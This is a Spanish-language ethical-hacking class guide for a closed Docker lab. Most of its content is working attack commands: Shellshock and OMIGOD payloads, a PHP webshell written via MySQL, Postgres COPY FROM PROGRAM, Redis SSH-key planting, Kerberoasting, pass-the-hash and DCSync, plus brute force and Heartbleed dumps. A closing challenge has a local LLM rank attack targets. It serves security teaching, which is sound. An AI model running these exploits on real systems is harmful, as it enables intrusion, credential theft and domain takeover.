# Clase 05 — Explotación de Servicios (FULL EXPLOTACIÓN)
### SENATI Tech · Módulo 05 "Ethical Hacking y Seguridad Ofensiva" · Qhapaq SAC
**Duración:** 180 min · **Todo corre dentro de Kali Linux 2026** (Docker dentro de Kali).

> En la Clase 04 hiciste el *gimnasio de NMAP* y caíste en servicios sueltos. Esta clase salda la deuda:
> **100% explotación** de SMB, MSSQL, Redis, MySQL, PostgreSQL, VNC, VoIP, RADIUS, impresoras, FTP,
> SSH, RDP, DNS, rpcclient, Kerberos, WinRM, SMTP, SNMP, HTTP/HTTPS y NoSQL — cada uno con la
> **misma metodología de 4 pasos**:
>
> **1) Escaneo del host → 2) Detección del servicio → 3) Enumeración → 4) Explotación**
> (ya sea por *mala práctica de configuración* o por un *CVE con su exploit*).

---

## Reglas del juego
- Todas las banderas tienen formato `QHAPAQ{...}`. **Están en el código fuente de `objetivo/`**: se evalúa tu **bitácora con la hora de captura y la evidencia**, no la bandera pegada.
- Alcance: **solo** la red `qhapaq-sede` (10.55.0.0/24). Nada fuera de ahí.
- Numeración de banderas **continua** con el módulo: C2 01–04, C3 05–10, C4 11–22, **C5 41–62** (web/API/móvil quedan para la Clase 06).
- Meta mínima de hoy: **banderas 41 a 54**. Las de "pros": 55–62 + los retos de la nube (MSSQL 52, Mongo 56) + el **reto Ollama**.

---

## Agenda (180 min)

| Bloque | Min | Servicio(s) | Técnica | 🚩 |
|---|---|---|---|---|
| Teoría | 15 | — | Metodología + estados de puerto + CVE vs misconfig | — |
| Lab 0 | 10 | — | Levantar el lab, ver IP de contenedores, verificador | — |
| Lab 1 | 25 | **FTP · SSH · Shellshock** | mod_copy (CVE), fuerza bruta+sudo, CGI bash (CVE) | 47,48,48b,53 |
| Lab 2 | 25 | **MySQL · PostgreSQL · Redis** | FILE→OUTFILE, COPY PROGRAM, SSH-key (RCE) | 50,50a,51,55 |
| *pausa* | 10 | | | |
| Lab 3 | 30 | **SMB · rpcclient · DNS · Kerberos** (AD) | sesión nula, AS-REP, Kerberoast, GPP, PtH | 42,43,44,45,46 |
| Lab 4 | 25 | **WinRM · Heartbleed · SNMP** | OMIGOD (CVE), fuga de memoria (CVE), comunidad RW | 41,54,57,57a |
| Lab 5 | 25 | **VNC · VoIP · RADIUS · Impresoras · SMTP** | password débil, SIP, secreto RADIUS, IPP, relay | 58,59,60,61,62 |
| Lab 6 | 10 | **RDP · MSSQL · Mongo** (opcional nube) | credencial, xp_cmdshell, NoSQL abierto | 49,52,52b,56 |
| Reto | 5 | **Ollama** | enumeración/triage automatizado con IA local | 🤖 |
| Cierre | — | | Entrega de bitácora | — |

---

## Teoría mínima (15 min)

**Metodología de explotación de un servicio** — cuatro pasos, siempre:
1. **Escaneo del host.** ¿Qué puertos están abiertos? `nmap -p- -sS <ip>` (todos los TCP), `nmap -sU --top-ports 50 <ip>` (UDP).
2. **Detección del servicio.** ¿Qué programa y qué versión hay detrás de cada puerto? `nmap -sV -sC <ip>`.
3. **Enumeración.** Sacarle todo *antes* de disparar: usuarios, recursos compartidos, bases, configuraciones, banners. Aquí se decide el ataque.
4. **Explotación.** Dos caminos:
   - **Mala práctica de configuración** → sin auth, credencial débil, permisos de más, comunidad por defecto, relay abierto.
   - **CVE** → una vulnerabilidad conocida del software + su exploit (Metasploit, un PoC o a mano).

**Una línea por idea:**
- `CVE` = identificador único de una vulnerabilidad pública (ej. `CVE-2021-38647`). `CVSS` = su puntaje de gravedad 0–10.
- *Misconfig* no sale en un escáner de CVEs: se encuentra **enumerando**.
- **RCE** = ejecución remota de código = el premio mayor. **LPE** = escalada local de privilegios (de usuario a root).
- "Shell como www-data/postgres/redis" **no es** root: casi siempre falta una escalada (ver sudo/GTFOBins).
- Un servicio en un puerto **no estándar** no aparece en `--top-1000`: por eso el `-p-`.

---

## Lab 0 — Levantar el laboratorio y verlo (10 min)

Dentro de tu **Kali**, como root:

```bash
# 1) Arrancar Docker en Kali (si no corre)
sudo service docker start            # o systemctl start docker

# 2) Construir y levantar TODO el laboratorio (primera vez: ~15-20 min, necesita internet)
cd objetivo
docker compose up -d --build

# 3) Confirmar que están los 15 contenedores arriba
docker compose ps
```

### Ver las IP de los contenedores  ⬅️ (lo que faltaba)
```bash
# La IP de UN contenedor concreto
docker inspect -f '{{.NetworkSettings.Networks.qhapaq-sede.IPAddress}}' qx-ftp

# TODAS las IP de un solo golpe (nombre -> IP)
docker inspect -f '{{.Name}} -> {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $(docker ps -q)

# Mapa completo de la red (lo más cómodo)
docker network inspect qhapaq-sede -f '{{range .Containers}}{{.Name}} {{.IPv4Address}}{{"\n"}}{{end}}'
```

> Guarda esa salida: es tu lista de objetivos. Las IP son **fijas** (ver tabla al final).

```bash
# 4) Verificar que tu Kali tiene las herramientas de hoy
bash scripts/00-verificar-entorno.sh
```

Perfiles opcionales (imágenes grandes de la nube, descárgalas si te alcanza el tiempo):
```bash
docker compose --profile nube up -d        # agrega qx-mssql (10.55.0.14) y qx-mongo (10.55.0.27)
```

Reiniciar un objetivo para el siguiente grupo:
```bash
docker compose restart qx-redis            # o docker compose down && up -d
```

---

## Lab 1 — FTP · SSH · Shellshock (25 min)

### 1A · FTP — ProFTPd 1.3.5 `mod_copy` (CVE-2015-3306)  🚩47
**Escaneo/Detección:**
```bash
nmap -p21 -sV 10.55.0.21
```
> Verás `ProFTPD 1.3.5rc3`. El módulo `mod_copy` permite copiar archivos con `SITE CPFR`/`SITE CPTO` **sin autenticarse**.

**Enumeración/Explotación (mala práctica + CVE):** copiamos un archivo que el servidor puede leer hacia una carpeta pública y lo descargamos como anónimos.
```bash
nc 10.55.0.21 21
# dentro de la sesión nc, escribe:
SITE CPFR /opt/respaldos/config.bak
SITE CPTO /var/ftp/incoming/robado.txt
QUIT
```
```bash
# leer lo copiado como usuario anónimo
curl --user 'anonymous:a@b.com' ftp://10.55.0.21/incoming/robado.txt
```
> En la vida real `CPTO` apunta al *DocumentRoot* de una web (ej. `/var/www/html/sh.php`) = **RCE**. Metasploit: `exploit/unix/ftp/proftpd_modcopy_exec`.

### 1B · SSH — credencial débil + escalada por `sudo` (GTFOBins)  🚩48 / 🚩48b
**Escaneo/Detección/Enumeración:**
```bash
nmap -p22 -sV 10.55.0.22            # OpenSSH 8.2p1
```
Diccionario **dirigido** (nombres de la empresa + estaciones del año, patrón que viste en C3):
```bash
cat > usuarios.txt <<'EOF'
jdiaz
mquispe
soporte
deploy
EOF
cat > claves.txt <<'EOF'
invierno2025
verano2025
otono2025
primavera2025
EOF
```
**Explotación — fuerza bruta:**
```bash
hydra -L usuarios.txt -P claves.txt ssh://10.55.0.22 -t 4
# -> login: soporte   password: verano2025
```
**Escalada a root — `sudo tar` (GTFOBins):**
```bash
ssh soporte@10.55.0.22
sudo -l                              # (root) NOPASSWD: /usr/bin/tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='/bin/cat /root/flag-root.txt'
```
> Una línea de teoría: `tar --checkpoint-action=exec` ejecuta un comando; si se corre con `sudo`, ese comando es **root**.

### 1C · HTTP — Shellshock (CVE-2014-6271)  🚩53
`qx-legacy` (10.55.0.43) es un Ubuntu 14.04 sin parchar.
```bash
nmap -p80,443 -sV 10.55.0.43
# el CGI /cgi-bin/estado.sh lo ejecuta bash -> inyectable
curl -H 'User-Agent: () { :;}; echo; /bin/cat /var/www/bandera-53.txt' \
     http://10.55.0.43/cgi-bin/estado.sh
```
> `() { :;};` cierra una "función" y lo que sigue se ejecuta en el bash del CGI. Metasploit: `exploit/multi/http/apache_mod_cgi_bash_env_exec`.

---

## Lab 2 — MySQL · PostgreSQL · Redis (25 min)

### 2A · MySQL — privilegio `FILE` → `INTO OUTFILE` (webshell = RCE)  🚩50 / 🚩50a
```bash
nmap -p3306,8080 -sV 10.55.0.33
```
La cuenta de aplicación `webapp:W3bApp#2023` (clave que apareció en recursos de C3) tiene `FILE`:
```bash
mysql -h 10.55.0.33 -u webapp -pW3bApp#2023

-- 🚩50a: secreto en una tabla
SELECT clave FROM qhapaq.secretos;
-- 🚩50 : escribir una webshell en el DocumentRoot de Apache (puerto 8080)
SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/sh.php';
EXIT
```
```bash
curl 'http://10.55.0.33:8080/sh.php?0=id;cat%20/opt/app/flag-mysql.txt'
```
> `secure_file_priv` vacío + privilegio `FILE` = MySQL escribe donde quiera. La shell corre como **www-data**.

### 2B · PostgreSQL — `COPY ... FROM PROGRAM` (CVE-2019-9193, RCE)  🚩51
```bash
nmap -p5432 -sV 10.55.0.32
```
La cuenta `appsql:Postgr3s#2024` es **superusuario** (mala práctica):
```bash
PGPASSWORD='Postgr3s#2024' psql -h 10.55.0.32 -U appsql -d erp

CREATE TABLE cmd (salida text);
COPY cmd FROM PROGRAM 'id; cat /opt/flag-pg.txt';
SELECT * FROM cmd;
```
> `COPY FROM PROGRAM` ejecuta comandos del SO como el usuario **postgres**. Metasploit: `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`.

### 2C · Redis — sin autenticación → inyección de clave SSH (RCE)  🚩55
```bash
nmap -p6379 -sV 10.55.0.63
redis-cli -h 10.55.0.63 ping         # PONG = sin clave
redis-cli -h 10.55.0.63 info server | grep version   # 5.0.7
```
**Explotación (escritura arbitraria → `authorized_keys`):**
```bash
# 1) tu llave
ssh-keygen -t rsa -N '' -f ./clave_redis
(echo; echo; cat ./clave_redis.pub; echo) > llave.txt

# 2) meter la llave en el home del usuario redis
cat llave.txt | redis-cli -h 10.55.0.63 -x set carga
redis-cli -h 10.55.0.63 config set dir /var/lib/redis/.ssh
redis-cli -h 10.55.0.63 config set dbfilename authorized_keys
redis-cli -h 10.55.0.63 save

# 3) entrar
ssh -i ./clave_redis redis@10.55.0.63 'cat /var/lib/redis/flag-redis.txt'
```
> Redis escribe su base donde le digas (`dir`+`dbfilename`); apuntándola a `.ssh/authorized_keys` obtienes shell. Otras variantes: cron en `/var/spool/cron`, módulos `.so`.

---

## Lab 3 — Active Directory: SMB · rpcclient · DNS · Kerberos (30 min)
Objetivo: **`qx-dc01` (10.55.0.10)** — controlador de dominio `QHAPAQ.LAB`.

```bash
nmap -sV -p53,88,135,139,389,445,464,636,3268 10.55.0.10
```
> 88 (Kerberos) + 389/636 (LDAP) + 445 (SMB) + 53 (DNS) = **es un DC**.

### 3A · rpcclient / SMB — sesión nula  🚩42
```bash
# recursos compartidos sin credencial
smbclient -N -L //10.55.0.10

# usuarios del dominio y sus DESCRIPCIONES (ahí dejan claves los administradores)
rpcclient -U "" -N 10.55.0.10 -c "enumdomusers"
rpcclient -U "" -N 10.55.0.10 -c "querydispinfo"
# -> la cuenta svc_impresion trae en su descripción la bandera y una clave temporal
```

### 3B · Kerberos — AS-REP Roasting (sin preautenticación)  🚩43
```bash
# usuarios a un archivo
rpcclient -U "" -N 10.55.0.10 -c enumdomusers | grep -oP '\[\K[^\]]+(?=\] rid)' > usuarios.txt

# pedir los AS-REP de cuentas con "no requiere preautenticación"
impacket-GetNPUsers qhapaq.lab/ -dc-ip 10.55.0.10 -usersfile usuarios.txt -no-pass -format hashcat -outputfile asrep.txt

# crackear
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# -> pramos : sunshine1
```
> Si una cuenta tiene *"Do not require Kerberos preauthentication"*, cualquiera pide su AS-REP y lo crackea offline.

### 3C · Kerberos — Kerberoasting (cuenta de servicio con SPN)  🚩44
```bash
impacket-GetUserSPNs qhapaq.lab/pramos:sunshine1 -dc-ip 10.55.0.10 -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
# -> svc_sql : Password123
```
> Cualquier usuario del dominio puede pedir el ticket (TGS) de una cuenta con SPN y crackear su clave offline.

### 3D · SYSVOL — GPP `cpassword` (MS14-025)  🚩45
`svc_impresion:Impresora2026!` (de la descripción del paso 3A) puede leer SYSVOL:
```bash
smbclient //10.55.0.10/SYSVOL -U 'qhapaq.lab\svc_impresion%Impresora2026!' \
  -c 'get qhapaq.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml'
# descifrar el cpassword (la clave AES es pública)
gpp-decrypt "<pega-aqui-el-cpassword>"
# -> adm_soporte : Soporte#Qhapaq2026
```

### 3E · Pass-the-Hash a Domain Admin  🚩46
`adm_soporte` es **Domain Admin**. Con su hash NT entras a cualquier recurso:
```bash
# hash NT de la clave (o dúmpalo con secretsdump si tienes DCSync)
impacket-secretsdump qhapaq.lab/adm_soporte:'Soporte#Qhapaq2026'@10.55.0.10 -just-dc-user Administrator
# Pass-the-Hash contra el recurso de Gerencia
smbclient //10.55.0.10/Gerencia -U 'QHAPAQ\adm_soporte' --pw-nt-hash --password=<HASH_NT> -c 'get bandera.txt'
```
> **DCSync** (`-just-dc`) deja volcar los hashes de todo el dominio. Un Domain Admin = el dominio completo.

---

## Lab 4 — WinRM · Heartbleed · SNMP (25 min)

### 4A · WinRM / OMI — OMIGOD (CVE-2021-38647)  🚩41
`qx-mgmt` (10.55.0.11) es un Linux con el agente **OMI** (el de las VMs Linux de Azure), que escucha en los puertos de WinRM.
```bash
nmap -p5985,5986 -sV 10.55.0.11
```
Un SOAP sin cabecera de autenticación ejecuta comandos como **root**:
```bash
curl -s -k -X POST https://10.55.0.11:5986/wsman \
  -H 'Content-Type: application/soap+xml;charset=UTF-8' \
  --data-binary @omigod.xml | grep -oP '<p:StdOut>\K[^<]*'
```
> La plantilla `omigod.xml` está en `objetivo/mgmt/` y en la chuleta. Metasploit: `exploit/linux/http/microsoft_omigod`.

### 4B · HTTPS — Heartbleed (CVE-2014-0160)  🚩54
`qx-legacy` (10.55.0.43) corre OpenSSL 1.0.1f.
```bash
nmap -p443 --script ssl-heartbleed 10.55.0.43        # VULNERABLE

# volcar memoria del proceso (el admin se loguea en bucle: su token queda ahí)
msfconsole -q -x "use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS 10.55.0.43; set VERBOSE true; run; exit"
# o el PoC heartbleed.py de la chuleta -> busca el token QHAPAQ{54...} en el volcado
```
> Heartbeat sin comprobar la longitud = el servidor devuelve hasta 64 KB de su RAM.

### 4C · SNMP — comunidad RW y fuga de información  🚩57 / 🚩57a
```bash
nmap -sU -p161 -sV 10.55.0.161
# fuga por la comunidad de lectura 'public'
snmpwalk -v2c -c public 10.55.0.161 system        # sysLocation trae 🚩57a
snmpwalk -v2c -c public 10.55.0.161 NET-SNMP-EXTEND-MIB::nsExtendOutputFull   # 🚩57 (salida de comandos expuesta)
# la comunidad de ESCRITURA 'private' permite modificar el agente (impersonar, inyectar)
snmpset -v2c -c private 10.55.0.161 SNMPv2-MIB::sysContact.0 s "atacante@evil.com"
```
> Comunidades por defecto (`public`/`private`) = acceso de lectura/escritura al dispositivo. Con RW y `NET-SNMP-EXTEND` se puede llegar a ejecución de comandos (depende del agente).

---

## Lab 5 — VNC · VoIP · RADIUS · Impresoras · SMTP (25 min)

### 5A · VNC — contraseña débil  🚩58
```bash
nmap -p5900 -sV 10.55.0.59
hydra -P claves.txt -s 5900 vnc://10.55.0.59       # -> monkey12
# conectar y leer la bandera del escritorio
vncviewer 10.55.0.59:5900                          # clave: monkey12
```

### 5B · VoIP — Asterisk SIP: enumerar extensiones + crackear secreto  🚩59
```bash
nmap -sU -p5060 -sV 10.55.0.60
svwar -m REGISTER -e 1000-2001 10.55.0.60          # enumera 1001, 1002, 2000
svcrack -u 1002 -d claves.txt 10.55.0.60           # -> 1002 : verano2025
```
> `alwaysauthreject=no` delata qué extensiones existen (SIPVicious). Con la extensión + secreto se registra un softphone pirata.

### 5C · RADIUS — secreto compartido por defecto  🚩60
```bash
nmap -sU -p1812 10.55.0.18
# el secreto NAS es 'testing123' (por defecto). Con él se validan credenciales:
radtest admin-wifi 'Wifi.Qhapaq!2026' 10.55.0.18 0 testing123
# Access-Accept + Reply-Message con la bandera. Clave mala -> Access-Reject.
```
> Con el secreto débil un atacante monta un NAS falso y/o craquea capturas de Access-Request/Response.

### 5D · Impresoras — CUPS/IPP expuesto + puerto crudo 9100  🚩61
```bash
nmap -p631,9100 -sV 10.55.0.31
# listar colas remotamente; la "ubicación" de la impresora filtra una nota con la bandera
lpstat -h 10.55.0.31:631 -l -p
# el panel web administrativo está expuesto a la red
curl http://10.55.0.31:631/printers/
```
> IPP (631) expuesto permite listar/añadir colas; el 9100 crudo (PJL/PostScript) permite capturar o inyectar trabajos de impresión.

### 5E · SMTP — relay abierto + enumeración de usuarios (VRFY)  🚩62
```bash
nmap -p25 -sV 10.55.0.25
# enumerar usuarios con VRFY
for u in jdiaz mquispe noexiste soporte; do (echo "VRFY $u"; sleep 1) | nc 10.55.0.25 25 | grep -E '25[02]|550'; done
# relay abierto (acepta correo de externo a externo)
swaks --server 10.55.0.25 --from atacante@externo.com --to victima@otro.com --body "relay abierto QHAPAQ{62-smtp-open-relay-y-vrfy}"
```
> `252` vs `550` = el usuario existe o no. `mynetworks=0.0.0.0/0` = cualquiera manda correo a través del servidor (spam/phishing).

---

## Lab 6 — RDP · MSSQL · MongoDB (opcional, 10 min)

### 6A · RDP — credencial débil  🚩49
```bash
nmap -p3389 -sV 10.55.0.38
hydra -l gerencia -P claves.txt rdp://10.55.0.38          # -> Gerencia#2025
xfreerdp /v:10.55.0.38 /u:gerencia /p:'Gerencia#2025' +clipboard   # bandera en el escritorio
```

### 6B · MSSQL — `sa` débil + `xp_cmdshell` (RCE)  🚩52 / 🚩52b  *(perfil nube)*
```bash
nmap -p1433 -sV 10.55.0.14
impacket-mssqlclient sa:'Qhapaq#2023'@10.55.0.14
SQL> SELECT clave FROM erp.dbo.secretos;          -- 🚩52
SQL> EXEC xp_cmdshell 'whoami & type C:\... || cat /tmp/flag-mssql.txt';   -- 🚩52b (RCE)
```

### 6C · MongoDB — sin autenticación (NoSQL)  🚩56  *(perfil nube)*
```bash
nmap -p27017 -sV 10.55.0.27
mongosh mongodb://10.55.0.27:27017
> use erp
> db.secretos.find()                               -- 🚩56
```

---

## Reto final — triage automatizado con Ollama 🤖 (5 min + tarea)
Ver `reto-ollama/README.md`. Idea: un LLM **local** (sin enviar nada a internet) que lee la salida de tus `nmap`/enumeración y te dice *qué atacar primero y con qué*. Es el "copiloto" del pentester, y entiende por qué **no** se le delega la decisión final.

```bash
cd reto-ollama
bash 00-instalar-ollama.sh         # instala ollama + modelo pequeño en Kali
bash triage.sh 10.55.0.0/24        # escanea, resume y pide prioridades al modelo
```

---

## Errores comunes
- **"No route to host" a un contenedor** → Docker no corre *dentro* de Kali, o usas Docker Desktop (sus IP de bridge no se alcanzan). Usa `docker.io` en Kali.
- **`hashcat` dice "No devices found"** → agrega `--force` o usa `john`.
- **`rockyou.txt` no está** → `sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz`.
- **Kerberos "KRB_AP_ERR_SKEW"** → tu reloj no coincide con el DC: `sudo ntpdate 10.55.0.10` o `sudo timedatectl set-ntp false; sudo date -s @$(…)`.
- **`gpp-decrypt` no está** → viene en Kali; si no, usa el one-liner de Python de la chuleta.
- **Heartbleed no "cae" a la primera** → es fuga aleatoria de RAM: repite el volcado varias veces hasta ver el token.
- **La primera compilación tarda** → `qx-legacy` recompila OpenSSL y `qx-dc01` aprovisiona el dominio (1–4 min cada uno). Es normal.

---

## Mapa de la red `qhapaq-sede` (10.55.0.0/24)

| IP | Contenedor | Puertos | Técnica | 🚩 |
|---|---|---|---|---|
| .10 | qx-dc01 | 53,88,139,389,445,636 | SMB nula, AS-REP, Kerberoast, GPP, PtH/DCSync | 42–46 |
| .11 | qx-mgmt | 5985,5986 | OMIGOD / WinRM (CVE-2021-38647) | 41 |
| .14 | qx-mssql | 1433 | sa débil + xp_cmdshell *(nube)* | 52,52b |
| .18 | qx-radius | 1812/udp | secreto compartido débil | 60 |
| .21 | qx-ftp | 21 | ProFTPd mod_copy (CVE-2015-3306) | 47 |
| .22 | qx-ssh | 22 | fuerza bruta + sudo tar | 48,48b |
| .25 | qx-smtp | 25 | open relay + VRFY | 62 |
| .27 | qx-mongo | 27017 | NoSQL sin auth *(nube)* | 56 |
| .31 | qx-printers | 631,9100 | CUPS/IPP + impresión cruda | 61 |
| .32 | qx-postgres | 5432 | COPY FROM PROGRAM (CVE-2019-9193) | 51 |
| .33 | qx-mysql | 3306,8080 | FILE → INTO OUTFILE webshell | 50,50a |
| .38 | qx-rdp | 3389 | credencial débil | 49 |
| .43 | qx-legacy | 80,443 | Shellshock + Heartbleed | 53,54 |
| .59 | qx-vnc | 5900 | password débil | 58 |
| .60 | qx-voip | 5060/udp | SIP enum + secreto débil | 59 |
| .63 | qx-redis | 6379 | sin auth → SSH key (RCE) | 55 |
| .161 | qx-snmp | 161/udp | comunidad RW + fuga | 57,57a |

---

## Entrega
Sube a tu repositorio una **bitácora** (`bitacora-clase05.md`) con, por cada bandera lograda:
1. El comando de **escaneo** y su salida (puerto + versión).
2. Lo que **enumeraste** (usuario, recurso, versión, config).
3. El comando de **explotación** y la **evidencia con hora** (`date -Is`).
4. Una línea: ¿fue **CVE** o **mala práctica**? ¿cómo se remedia?

Meta mínima: **41–54**. Pros: **55–62 + nube + reto Ollama**.
